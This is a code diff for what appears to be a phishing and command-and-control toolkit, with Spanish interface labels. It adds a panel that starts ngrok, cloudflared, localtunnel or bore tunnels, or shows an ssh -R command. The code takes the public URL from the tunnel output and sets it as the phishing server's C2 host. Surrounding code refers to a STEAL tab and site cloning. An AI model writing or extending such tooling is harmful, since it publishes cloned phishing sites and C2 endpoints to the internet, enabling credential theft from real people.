@@ -3496,6 +3496,53 @@ textarea.fi{resize:vertical;min-height:48px}
       </div>
       <div id="tmpl-status" style="display:none;align-items:center;gap:8px;background:#080a04;border:1px solid #2a3a10;border-radius:3px;padding:6px 12px;font-size:12px;margin-top:4px;width:100%"><span id="tmpl-status-icon" style="font-size:14px"></span><span id="tmpl-status-msg" style="flex:1;color:var(--txt)"></span><span id="tmpl-status-url" style="font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--cyan);word-break:break-all"></span><button id="tmpl-status-copy" style="display:none;background:transparent;border:1px solid var(--cyan);color:var(--cyan);border-radius:2px;padding:2px 7px;font-size:10px;cursor:pointer;white-space:nowrap" onclick="copyDeployUrl()">&#8856; COPY URL</button></div>
     </div>
+
+    <!-- ─── TUNNEL EXPOSURE ──────────────────────────────────── -->
+    <div class="sdiv" style="margin-top:10px;color:#4dc8b0">EXPONER EN RED &mdash; TUNNELING</div>
+    <div style="font-size:11px;color:var(--dim);margin-bottom:6px">
+      Con el sitio ya desplegado en local, elige un m&#233;todo para obtener una URL p&#250;blica y compartirla en la misma sesi&#243;n.
+    </div>
+
+    <!-- Tunnel method buttons -->
+    <div style="display:flex;gap:5px;flex-wrap:wrap;margin-bottom:6px;align-items:center">
+      <button class="mob-tmpl-btn" id="tun-btn-ngrok"       onclick="startTunnel('ngrok')"       style="border-color:#1a3a1a">NGROK</button>
+      <button class="mob-tmpl-btn" id="tun-btn-cloudflared" onclick="startTunnel('cloudflared')" style="border-color:#2a1800">CLOUDFLARED</button>
+      <button class="mob-tmpl-btn" id="tun-btn-lt"          onclick="startTunnel('localtunnel')" style="border-color:#001a30">LOCALTUNNEL</button>
+      <button class="mob-tmpl-btn" id="tun-btn-bore"        onclick="startTunnel('bore')"        style="border-color:#2a0a3a">BORE</button>
+      <button class="mob-tmpl-btn" id="tun-btn-ssh"         onclick="showSshTunnel()"            style="border-color:#1a1a30">SSH</button>
+      <button class="sbtn" style="font-size:11px;padding:4px 12px;margin-left:auto" id="tun-stop-btn" onclick="stopTunnel()" disabled>&#9632; STOP TUNNEL</button>
+    </div>
+
+    <!-- SSH command (shown on SSH click) -->
+    <div id="tun-ssh-block" style="display:none;background:#010403;border:1px solid var(--brd);border-radius:3px;padding:8px 10px;margin-bottom:6px">
+      <div style="font-size:11px;color:var(--dim);margin-bottom:4px">&#x1F4CB; Ejecuta en tu terminal (sustituye <b style="color:var(--txt)">user@vps-ip</b>):</div>
+      <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap">
+        <code id="tun-ssh-cmd-text" style="flex:1;font-size:12px;color:var(--cyan);font-family:'JetBrains Mono',monospace;word-break:break-all">ssh -R 80:localhost:5000 user@vps-ip</code>
+        <button class="kbtn" style="font-size:10px;padding:1px 7px;flex-shrink:0" onclick="copyEl('tun-ssh-cmd-text')">&#8856; COPY</button>
+      </div>
+      <div style="font-size:11px;color:var(--dim);margin-top:4px">Pega manualmente la URL p&#250;blica del VPS abajo:</div>
+      <div style="display:flex;gap:6px;margin-top:4px">
+        <input class="fi" id="tun-ssh-manual-url" placeholder="https://vps-ip o http://vps-ip:80" style="font-size:11px;flex:1">
+        <button class="kbtn" style="font-size:10px;padding:2px 8px;border-color:#4dc8b0;color:#4dc8b0;flex-shrink:0" onclick="tunApplyManualSsh()">&#8656; USAR COMO C2</button>
+      </div>
+    </div>
+
+    <!-- Status + detected public URL -->
+    <div id="tun-status-row" style="display:none;margin-bottom:6px">
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:5px">
+        <div class="lab-srv-dot" id="tun-dot"></div>
+        <span id="tun-status-text" style="font-size:12px;color:var(--mut)">Iniciando...</span>
+      </div>
+      <div class="lab-url-box" id="tun-url-box" style="display:none">
+        <span>&#127760;</span>
+        <span class="lab-url-text" id="tun-public-url"></span>
+        <button class="kbtn" style="font-size:10px;padding:1px 7px;flex-shrink:0" onclick="tunCopyUrl()">&#8856; COPY</button>
+        <button class="kbtn" style="border-color:#4dc8b0;color:#4dc8b0;font-size:10px;padding:1px 7px;flex-shrink:0" onclick="tunApplyAsC2()" title="Actualiza el host del servidor C2 con esta URL">&#8656; USAR COMO C2</button>
+      </div>
+    </div>
+
+    <!-- Streaming output -->
+    <div id="tun-out-area" style="display:none;background:#010202;border:1px solid #0a2010;border-radius:3px;max-height:110px;overflow-y:auto;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.5;padding:7px 10px;color:#60b080;white-space:pre-wrap;word-break:break-all"></div>
   </div>
 
   <!-- ── STEAL ── -->
@@ -10839,6 +10886,176 @@ function _labModeCheck() {
   if (_isPrivateHost(host)) return true;
   showTmplStatus('LAB MODE ACTIVO — Deployment bloqueado para host público: "' + host + '". Ve a la pestaña LAB y cambia a IP privada o desactiva Lab Mode.', 'err');
   return false;
+}
+
+/* ─── TUNNEL EXPOSURE (TEMPLATES tab) ─────────────────────── */
+var _tunProcId   = null;
+var _tunPollTmr  = null;
+var _tunType     = null;
+
+var _TUN_CMDS = {
+  ngrok:       function(p){ return 'ngrok http ' + p; },
+  cloudflared: function(p){ return 'cloudflared tunnel --url http://localhost:' + p; },
+  localtunnel: function(p){ return 'npx localtunnel --port ' + p; },
+  bore:        function(p){ return 'bore local ' + p + ' --to bore.pub'; }
+};
+
+var _TUN_URL_RE = {
+  ngrok:       /https:\/\/[a-z0-9-]+\.ngrok[-a-z.]*\.(app|io|dev)/i,
+  cloudflared: /https:\/\/[a-z0-9-]+\.trycloudflare\.com/i,
+  localtunnel: /https?:\/\/[a-z0-9-]+\.loca\.lt/i,
+  bore:        /bore\.pub:\d+/i
+};
+
+function _tunPort() {
+  return (document.getElementById('phish-server-port') || {value:'5000'}).value || '5000';
+}
+
+function _tunSetActive(type) {
+  ['ngrok','cloudflared','localtunnel','bore','ssh'].forEach(function(k) {
+    var b = document.getElementById('tun-btn-' + k);
+    if (b) b.classList.toggle('on', k === type);
+  });
+}
+
+function startTunnel(type) {
+  stopTunnel();
+  _tunType = type;
+  var cmdFn = _TUN_CMDS[type];
+  if (!cmdFn) return;
+  var port = _tunPort();
+  document.getElementById('tun-ssh-block').style.display = 'none';
+  document.getElementById('tun-status-row').style.display = '';
+  document.getElementById('tun-out-area').style.display = '';
+  document.getElementById('tun-url-box').style.display = 'none';
+  document.getElementById('tun-stop-btn').disabled = false;
+  var dot = document.getElementById('tun-dot');
+  if (dot) dot.className = 'lab-srv-dot checking';
+  _tunSetStatus('Iniciando ' + type + ' en puerto ' + port + '...');
+  _tunSetActive(type);
+
+  var procId = 'tun_' + Date.now();
+  _tunProcId = procId;
+  fetch(API + '/run', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({cmd: cmdFn(port), id: procId})
+  })
+  .then(function(r){ return r.json(); })
+  .then(function(d){
+    if (d.error) { _tunSetStatus('Error al iniciar: ' + d.error); return; }
+    _tunSetStatus('Proceso iniciado — esperando URL pública...');
+    _tunPoll(procId, type);
+  })
+  .catch(function(e){ _tunSetStatus('Error: ' + e); });
+}
+
+function _tunPoll(procId, type) {
+  if (_tunPollTmr) clearInterval(_tunPollTmr);
+  var re = _TUN_URL_RE[type];
+  var attempts = 0;
+  _tunPollTmr = setInterval(function() {
+    attempts++;
+    fetch(API + '/output/' + procId)
+      .then(function(r){ return r.json(); })
+      .then(function(d){
+        var out = Array.isArray(d.output) ? d.output.join('\n') : (d.output || '');
+        var el = document.getElementById('tun-out-area');
+        if (el) { el.textContent = out; el.scrollTop = el.scrollHeight; }
+        var m = re && out.match(re);
+        if (m) {
+          var url = (type === 'bore') ? 'http://' + m[0] : m[0];
+          _tunShowUrl(url);
+          clearInterval(_tunPollTmr); _tunPollTmr = null;
+        } else if (d.done) {
+          _tunSetStatus('Proceso finalizado — no se detectó URL pública en la salida');
+          var dot = document.getElementById('tun-dot'); if (dot) dot.className = 'lab-srv-dot';
+          document.getElementById('tun-stop-btn').disabled = true;
+          clearInterval(_tunPollTmr); _tunPollTmr = null;
+        } else if (attempts > 120) {
+          _tunSetStatus('Timeout — revisa la salida. Si ya tienes la URL, pégala manualmente como C2.');
+          clearInterval(_tunPollTmr); _tunPollTmr = null;
+        }
+      })
+      .catch(function(){ clearInterval(_tunPollTmr); _tunPollTmr = null; });
+  }, 1500);
+}
+
+function _tunSetStatus(msg, ok) {
+  var el = document.getElementById('tun-status-text');
+  if (el) { el.textContent = msg; el.style.color = ok ? 'var(--g2)' : 'var(--mut)'; }
+}
+
+function _tunShowUrl(url) {
+  var dot = document.getElementById('tun-dot');
+  if (dot) dot.className = 'lab-srv-dot ok';
+  _tunSetStatus('Tunnel activo — URL pública detectada', true);
+  var box = document.getElementById('tun-url-box');
+  var urlEl = document.getElementById('tun-public-url');
+  if (box) box.style.display = '';
+  if (urlEl) urlEl.textContent = url;
+}
+
+function stopTunnel() {
+  if (_tunPollTmr) { clearInterval(_tunPollTmr); _tunPollTmr = null; }
+  if (_tunProcId) { fetch(API + '/kill/' + _tunProcId).catch(function(){}); _tunProcId = null; }
+  _tunType = null;
+  _tunSetActive(null);
+  var dot = document.getElementById('tun-dot'); if (dot) dot.className = 'lab-srv-dot';
+  var btn = document.getElementById('tun-stop-btn'); if (btn) btn.disabled = true;
+  document.getElementById('tun-status-row').style.display = 'none';
+  document.getElementById('tun-out-area').style.display = 'none';
+  document.getElementById('tun-ssh-block').style.display = 'none';
+}
+
+function showSshTunnel() {
+  stopTunnel();
+  _tunSetActive('ssh');
+  var port = _tunPort();
+  var cmd = document.getElementById('tun-ssh-cmd-text');
+  if (cmd) cmd.textContent = 'ssh -R 80:localhost:' + port + ' user@vps-ip';
+  document.getElementById('tun-ssh-block').style.display = '';
+}
+
+function tunCopyUrl() {
+  var el = document.getElementById('tun-public-url');
+  if (el) navigator.clipboard.writeText(el.textContent).catch(function(){});
+  var btn = typeof event !== 'undefined' && event && event.target ? event.target : null;
+  if (btn) { var o = btn.textContent; btn.textContent = '&#10003;'; setTimeout(function(){ btn.textContent = o; }, 900); }
+}
+
+function tunApplyAsC2() {
+  var el = document.getElementById('tun-public-url');
+  if (!el || !el.textContent.trim()) return;
+  _tunApplyUrl(el.textContent.trim());
+  var btn = typeof event !== 'undefined' && event && event.target ? event.target : null;
+  if (btn) { var o = btn.textContent; btn.textContent = '&#10003; APLICADO'; setTimeout(function(){ btn.textContent = o; }, 1500); }
+}
+
+function tunApplyManualSsh() {
+  var el = document.getElementById('tun-ssh-manual-url');
+  if (!el || !el.value.trim()) return;
+  _tunApplyUrl(el.value.trim());
+  var btn = typeof event !== 'undefined' && event && event.target ? event.target : null;
+  if (btn) { var o = btn.textContent; btn.textContent = '&#10003; APLICADO'; setTimeout(function(){ btn.textContent = o; }, 1500); }
+}
+
+function _tunApplyUrl(url) {
+  try {
+    if (!url.startsWith('http')) url = 'http://' + url;
+    var parsed = new URL(url);
+    var hEl  = document.getElementById('phish-server-host');
+    var pEl  = document.getElementById('phish-server-port');
+    var prEl = document.getElementById('phish-server-proto');
+    var host = parsed.hostname + (parsed.port ? ':' + parsed.port : '');
+    if (hEl)  hEl.value  = parsed.hostname;
+    if (pEl)  pEl.value  = parsed.port || (parsed.protocol === 'https:' ? '443' : '80');
+    if (prEl) prEl.value = parsed.protocol.replace(':','');
+    _savePhishHost();
+  } catch(e) {
+    var hEl = document.getElementById('phish-server-host');
+    if (hEl) { hEl.value = url; _savePhishHost(); }
+  }
 }
 
 function mobCloneSite() {
